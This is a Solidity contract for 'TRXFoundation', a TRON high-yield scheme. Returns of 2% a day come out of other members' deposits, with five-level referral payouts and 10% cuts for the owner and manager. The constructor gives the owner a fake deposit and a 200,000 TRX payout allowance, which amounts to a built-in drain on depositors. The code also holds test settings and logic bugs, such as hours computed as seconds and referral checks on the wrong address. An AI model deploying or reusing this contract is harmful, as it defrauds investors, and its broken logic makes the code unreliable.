pragma solidity ^0.5.4;

contract TRXFoundation {

    using SafeMath for uint256;

    uint public totalPlayers;
    uint public totalPayout;
    uint public totalInvested;
    uint public toTrx = 1000000;
    uint public minDepositSize = 10*toTrx; // 100
    uint public plus1k = 50*toTrx; // 1000
    uint public plus10k = 100*toTrx; // 10000
    uint public plus100k = 200*toTrx; // 100000
    uint private boostPeriod = 180; // 86400*7 

    uint public interestRateDivisor = 100000000000;
    uint public devCommission = 10;
    uint public commissionDivisor = 100;
    uint public hourRate = 83333333; //DAILY 2%
 //   uint private releaseTime = 1593702000;

    address payable owner;
    address payable manager;

    struct Player {

        uint trxDeposit;
        uint time;        
        uint roiProfit;
        uint payoutSum;
        uint maxRec;
        uint isActive;
        address payable refFrom;
        uint256 ref1sum; //5 level
        uint256 ref2sum;
        uint256 ref3sum;
        uint256 ref4sum;
        uint256 ref5sum;
        uint hourPassed;  
        uint isReInvest;
        
    }

    struct Business {

        uint myTotalInvestment;
        uint myTotalDirectBiz;
        uint directBiz; 
        uint myTotalBiz;
        uint joiningTime;        
        uint boostedTime;        
        uint isBoost;
        uint refRewards;
        uint payRewards;
        uint roiRewards;
        uint totalRewards; 
        uint maxRoi;
        uint isLock;
    }

    mapping(address => Player) public players;
    mapping(address => Business) public playersBiz;

    constructor() public {
      owner = 0x41F6fAb3DaeAb041F9eC03565Cff12c2015891E3;
      manager = 0x9b91a2844075a87C400b2a80D405474efCE32605; // test maanager
    // manager = 0x5A617911d95120B25b3c6d473D4450F9e4c801f2;   // real manager
     Player storage player = players[owner];
     Business storage playerbiz = playersBiz[owner];
     totalPlayers++;
     player.trxDeposit = plus10k;
     player.maxRec = 2000*plus10k;
     player.time = now;
     playerbiz.joiningTime = now;
     player.isActive = 1;

      Player storage player2 = players[manager];
      Business storage playerbiz2 = playersBiz[manager];
      
      totalPlayers++;
   
     } 

    function register(address payable _addr, address payable _refAddr) private{

      Player storage player = players[_addr];
      Business storage playerbiz = playersBiz[_addr];

      player.refFrom = _refAddr;

      address payable _refAddr1 = _refAddr;
      address payable _refAddr2 = players[_refAddr1].refFrom;
      address payable _refAddr3 = players[_refAddr2].refFrom;
      address payable _refAddr4 = players[_refAddr3].refFrom;
      address payable _refAddr5 = players[_refAddr4].refFrom;
    
      players[_refAddr1].ref1sum = players[_refAddr1].ref1sum.add(1);
      players[_refAddr2].ref2sum = players[_refAddr2].ref2sum.add(1);
      players[_refAddr3].ref3sum = players[_refAddr3].ref3sum.add(1);
      players[_refAddr4].ref4sum = players[_refAddr4].ref4sum.add(1);
      players[_refAddr5].ref5sum = players[_refAddr5].ref5sum.add(1); 

    }

    function () external payable {

    }

    function invest(address payable _refAddr) public payable {
        collect(msg.sender);
        require(msg.value >= minDepositSize);
 
        uint depositAmount = msg.value;

        Player storage player = players[msg.sender];
        Business storage playerbiz = playersBiz[msg.sender];

        if (player.time == 0) {
            
            player.time = now;
            player.isActive = 1;
            playerbiz.joiningTime = now;
            playerbiz.isBoost = 0;
            totalPlayers++;
            
            if(_refAddr != address(0) && players[_refAddr].trxDeposit > 0){
              register(msg.sender, _refAddr);
              playersBiz[_refAddr].directBiz += msg.value ;
           
              if(playersBiz[_refAddr].isBoost == 0){
                if(players[_refAddr].trxDeposit >= 2*playersBiz[_refAddr].directBiz 
                    && ((playersBiz[_refAddr].joiningTime + boostPeriod ) < now ))
               { 
                  playersBiz[_refAddr].isBoost = 1;
                  playersBiz[_refAddr].boostedTime = now;
               }
             }
              
            }
            else
            {
              register(msg.sender, owner);
              playersBiz[_refAddr].directBiz += msg.value ;

            }
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);
        playersBiz[msg.sender].myTotalInvestment = playersBiz[msg.sender].myTotalInvestment.add(depositAmount);

        if(msg.value >= plus100k){
             player.maxRec = player.trxDeposit.mul(25).div(10);
        } else {
             player.maxRec = player.trxDeposit.mul(2);
        }

        player.isActive = 1;

        distributeRef(msg.value, player.refFrom); 

        totalInvested = totalInvested.add(depositAmount);
        uint devEarn = depositAmount.mul(devCommission).div(commissionDivisor);
        owner.transfer(devEarn);
        manager.transfer(devEarn);
    }

    function reinvest() public payable {
        
        collect(msg.sender);
        Player storage player = players[msg.sender];
        Business storage playerbiz = playersBiz[msg.sender];
        require(msg.value >= player.trxDeposit && player.isReInvest == 1);
 
         uint depositAmount = msg.value;
         address payable _refAddr = player.refFrom;
 
        if (player.time == 0) {
            
            player.time = now;
            player.isActive = 1;
            playerbiz.joiningTime = now;
            playerbiz.isBoost = 0;
            playerbiz.boostedTime = 0;
            player.isReInvest = 0;
            playerbiz.directBiz = 0;
            player.hourPassed = 0;
             
            if(_refAddr != address(0) && players[_refAddr].trxDeposit > 0){
               playersBiz[_refAddr].directBiz += msg.value ;

             if(playersBiz[_refAddr].isBoost == 0){
                if(players[_refAddr].trxDeposit >= 2*playersBiz[_refAddr].directBiz 
                    && ((playersBiz[_refAddr].joiningTime + boostPeriod ) < now ))
                 { 
                  playersBiz[_refAddr].isBoost = 1;
                 }
              }  
           } 
        }

        player.trxDeposit = msg.value;
        playerbiz.myTotalInvestment = playerbiz.myTotalInvestment.add(depositAmount);
       
        if(msg.value >= plus100k){
             player.maxRec = player.trxDeposit.mul(25).div(10);
        } else {
             player.maxRec = player.trxDeposit.mul(2);
        }

        player.isActive = 1;

        distributeRef(msg.value, player.refFrom); 

        totalInvested = totalInvested.add(depositAmount);
        uint devEarn = depositAmount.mul(devCommission).div(commissionDivisor);
        owner.transfer(devEarn);
        manager.transfer(devEarn);

    }

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].roiProfit > 0 && players[msg.sender].isActive == 1);

        transferPayout(msg.sender, players[msg.sender].roiProfit);
    } 

    function collect(address payable _addr) public returns (uint) {
        Player storage player = players[_addr];

        uint hourPassed = toHours(player.time);
         if (hourPassed > 0 && player.time > 0) {

          if(player.trxDeposit >= plus100k){
            if(hourPassed >= 3000){
              hourPassed = 3000;
            }
          } else if(hourPassed >=2400){
                 hourPassed=2400;
             }
            uint collectProfit = (player.trxDeposit.mul(hourPassed.mul(hourRate))).div(interestRateDivisor);
            if(playersBiz[_addr].isBoost == 1){
                collectProfit = collectProfit.mul(15).div(10);
            }
            playersBiz[msg.sender].maxRoi = player.maxRec - player.payoutSum;
            if(collectProfit >= playersBiz[msg.sender].maxRoi){
              collectProfit = playersBiz[msg.sender].maxRoi;
            }
            player.roiProfit = player.roiProfit.add(collectProfit);
            player.hourPassed = player.hourPassed.add(hourPassed);
         }
    }

     function toHours(uint _time) internal view returns (uint) {
        uint _sec = now  - _time;
        uint _tomin = _sec/60;
         uint _tohour = _tomin/60;

         if(_sec > 2400){
             _sec = 2400;
         }
         return _sec;
    //     if(_tohour > 2400){
    //     _tohour = 2400;
    //   }
    //        return _tohour; // _tohour
    }

    function transferPayout(address payable _receiver, uint _amount) internal {

        require(players[_receiver].isActive == 1);

        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
 
            if (contractBalance > 0) {

                uint payout = _amount > contractBalance ? contractBalance : _amount;
 
                Player storage player = players[_receiver];
                if(player.payoutSum.add(payout) >= player.maxRec){
                    payout = player.maxRec - player.payoutSum;
                    player.isActive = 0;
                    player.isReInvest = 1;
                }

                player.payoutSum = player.payoutSum.add(payout);
                player.roiProfit = player.roiProfit.sub(payout);
                totalPayout = totalPayout.add(payout);

                if(payout > 0){
                   msg.sender.transfer(payout);
                   uint devEarn = payout.mul(devCommission).div(commissionDivisor);
                   owner.transfer(devEarn);
                   manager.transfer(devEarn);

                    address payable _refAddr1 = player.refFrom;
                    
                    address payable _refAddr2 = players[_refAddr1].refFrom;
                    address payable _refAddr3 = players[_refAddr2].refFrom;
                    address payable _refAddr4 = players[_refAddr3].refFrom;
                    address payable _refAddr5 = players[_refAddr4].refFrom;
                    uint _payRewards = (payout.mul(5)).div(100);


                   if (  players[_refAddr1].isActive == 1 &&  players[_refAddr1].trxDeposit >= plus10k) {
                              playersBiz[_refAddr1].payRewards = _payRewards.add(playersBiz[_refAddr1].payRewards);
                              playersBiz[_refAddr1].totalRewards = _payRewards.add(playersBiz[_refAddr1].totalRewards);
                              players[_refAddr1].payoutSum = _payRewards.add(players[_refAddr1].payoutSum);
                            _refAddr1.transfer(_payRewards);
                            
                            checkActive(_refAddr1);
                     }
                       if (  players[_refAddr2].isActive == 1 &&  players[_refAddr2].trxDeposit >= plus10k) {
                              playersBiz[_refAddr2].payRewards = _payRewards.add(playersBiz[_refAddr2].payRewards);
                              playersBiz[_refAddr2].totalRewards = _payRewards.add(playersBiz[_refAddr2].totalRewards);
                              players[_refAddr2].payoutSum = _payRewards.add(players[_refAddr2].payoutSum);
                            _refAddr2.transfer(_payRewards);
                             checkActive(_refAddr2);
                    }
                       if (  players[_refAddr3].isActive == 1 &&  players[_refAddr1].trxDeposit >= plus10k) {
                              playersBiz[_refAddr3].payRewards = _payRewards.add(playersBiz[_refAddr3].payRewards);
                              playersBiz[_refAddr3].totalRewards = _payRewards.add(playersBiz[_refAddr3].totalRewards);
                              players[_refAddr3].payoutSum = _payRewards.add(players[_refAddr3].payoutSum);
                            _refAddr3.transfer(_payRewards);
                            checkActive(_refAddr3);
                     }
                       if (  players[_refAddr4].isActive == 1 &&  players[_refAddr1].trxDeposit >= plus10k) {
                              playersBiz[_refAddr4].payRewards = _payRewards.add(playersBiz[_refAddr4].payRewards);
                              playersBiz[_refAddr4].totalRewards = _payRewards.add(playersBiz[_refAddr4].totalRewards);
                              players[_refAddr4].payoutSum = _payRewards.add(players[_refAddr4].payoutSum);
                            _refAddr4.transfer(_payRewards);
                            checkActive(_refAddr4);
                     }
                       if (  players[_refAddr5].isActive == 1 &&  players[_refAddr1].trxDeposit >= plus10k) {
                              playersBiz[_refAddr5].payRewards = _payRewards.add(playersBiz[_refAddr5].payRewards);
                              playersBiz[_refAddr5].totalRewards = _payRewards.add(playersBiz[_refAddr5].totalRewards);
                              players[_refAddr5].payoutSum = _payRewards.add(players[_refAddr5].payoutSum);
                            _refAddr5.transfer(_payRewards);
                            checkActive(_refAddr5);
                     }
                } 
            }
        }
    }

    function distributeRef(uint256 _trx, address payable _refFrom) private{

        uint256 _allref = (_trx.mul(10)).div(100);

        address payable _refAddr1 = _refFrom;
        address payable _refAddr2 = players[_refAddr1].refFrom;
        address payable _refAddr3 = players[_refAddr2].refFrom;
        address payable _refAddr4 = players[_refAddr3].refFrom;
        address payable _refAddr5 = players[_refAddr4].refFrom;
        uint256 _refRewards = 0;

        if (_refAddr1 != address(0) && players[_refAddr1].isActive == 1 ) {
            if(players[_refAddr1].trxDeposit >= plus1k){
              _refRewards = (_trx.mul(5)).div(100);
              _allref = _allref.sub(_refRewards);
              playersBiz[_refAddr1].refRewards = _refRewards.add(playersBiz[_refAddr1].refRewards);
              playersBiz[_refAddr1].totalRewards = _refRewards.add(playersBiz[_refAddr1].totalRewards);
              playersBiz[_refAddr1].myTotalDirectBiz += msg.value ;
              playersBiz[_refAddr1].myTotalBiz += msg.value ;
              players[_refAddr1].payoutSum += _refRewards ;
              _refAddr1.transfer(_refRewards);
              checkActive(_refAddr1);
            }
           
        }

        if (_refAddr2 != address(0) && players[_refAddr2].isActive == 1 ) {
            if(players[_refAddr2].trxDeposit >= plus1k){
            _refRewards = (_trx.mul(2)).div(100);
            _allref = _allref.sub(_refRewards);
            playersBiz[_refAddr2].refRewards = _refRewards.add(playersBiz[_refAddr2].refRewards);
            playersBiz[_refAddr2].totalRewards = _refRewards.add(playersBiz[_refAddr2].totalRewards);
            playersBiz[_refAddr2].myTotalDirectBiz += msg.value ;
              playersBiz[_refAddr2].myTotalBiz += msg.value ;
              players[_refAddr2].payoutSum += _refRewards ;
            _refAddr2.transfer(_refRewards);
            checkActive(_refAddr2);
            }
        }

        if (_refAddr3 != address(0) && players[_refAddr3].isActive == 1 ) {
            if(players[_refAddr3].trxDeposit >= plus1k){
            _refRewards = (_trx.mul(1)).div(100);
            _allref = _allref.sub(_refRewards);
            playersBiz[_refAddr3].refRewards = _refRewards.add(playersBiz[_refAddr3].refRewards);
            playersBiz[_refAddr3].totalRewards = _refRewards.add(playersBiz[_refAddr3].totalRewards);
            playersBiz[_refAddr3].myTotalDirectBiz += msg.value ;
              playersBiz[_refAddr3].myTotalBiz += msg.value ;
              players[_refAddr3].payoutSum += _refRewards ;
            _refAddr3.transfer(_refRewards);
            checkActive(_refAddr3);
            }
        }

        if (_refAddr4 != address(0) && players[_refAddr4].isActive == 1 ) {
             if(players[_refAddr4].trxDeposit >= plus1k){
           _refRewards = (_trx.mul(1)).div(100);
            _allref = _allref.sub(_refRewards);
            playersBiz[_refAddr4].totalRewards = _refRewards.add(playersBiz[_refAddr4].totalRewards);
            playersBiz[_refAddr4].refRewards = _refRewards.add(playersBiz[_refAddr4].refRewards);
            playersBiz[_refAddr4].myTotalDirectBiz += msg.value ;
              playersBiz[_refAddr4].myTotalBiz += msg.value ;
              players[_refAddr4].payoutSum += _refRewards ;
            _refAddr4.transfer(_refRewards);
            checkActive(_refAddr4);
          }
        }

        if (_refAddr5 != address(0) && players[_refAddr5].isActive == 1 ) {
          if(players[_refAddr5].trxDeposit >= plus1k){
          _refRewards = (_trx.mul(1)).div(100);
            _allref = _allref.sub(_refRewards);
            playersBiz[_refAddr5].refRewards = _refRewards.add(playersBiz[_refAddr5].refRewards);
            playersBiz[_refAddr5].totalRewards = _refRewards.add(playersBiz[_refAddr5].totalRewards);
            playersBiz[_refAddr5].myTotalDirectBiz += msg.value ;
              playersBiz[_refAddr5].myTotalBiz += msg.value ;
              players[_refAddr5].payoutSum += _refRewards ;
            _refAddr5.transfer(_refRewards);
            checkActive(_refAddr5);
          }
        }

        
        if(_allref > 0 ){
            owner.transfer(_allref);
        }
    }

    function checkActive(address payable _addr) private {
      if(players[_addr].payoutSum >= players[_addr].maxRec){ 
        players[_addr].isActive = 0;
        players[_addr].isReInvest = 1; 
      }
    }

  function getNow() public view returns (uint) {
       return now;
       }   


 function checkOwner() public view returns  (address payable){  
      return  owner ;
   }

   function checkManager() public view returns  (address payable){   
      return  manager ;
   }

   function changeOwner(address payable _newOwner) public {  
     require(msg.sender == owner,"You are not owner");
         owner = _newOwner;
   }

   function changeManager(address payable _newManager) public {  
    require(msg.sender == manager,"You are not manager");
         manager = _newManager;
   } 


}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}
